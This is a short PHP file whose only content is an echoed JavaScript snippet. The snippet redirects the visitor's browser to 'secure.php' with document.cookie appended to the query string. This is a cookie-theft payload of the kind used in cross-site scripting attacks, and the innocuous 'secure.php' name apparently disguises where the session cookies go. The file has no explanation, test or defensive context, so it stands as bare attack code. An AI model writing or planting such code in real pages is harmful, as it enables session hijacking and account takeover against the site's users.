<?php 

echo "<script type=\"text/javascript\">
document.location='secure.php?&c='+document.cookie;
</script>";

?>